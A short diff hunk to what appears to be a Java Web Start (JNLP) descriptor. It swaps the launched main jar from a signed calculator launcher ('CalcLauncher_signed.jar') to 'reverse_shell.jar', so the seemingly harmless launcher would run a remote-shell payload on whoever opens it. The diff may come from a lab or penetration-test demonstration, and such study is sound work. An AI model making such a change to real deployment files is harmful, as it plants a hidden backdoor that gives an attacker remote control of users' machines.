@@ -9,7 +9,7 @@
 
     <resources>
         <j2se version="1.8+"/>
-                <jar href="CalcLauncher_signed.jar"
+                <jar href="reverse_shell.jar"
                     main="true"/>
     </resources>
 
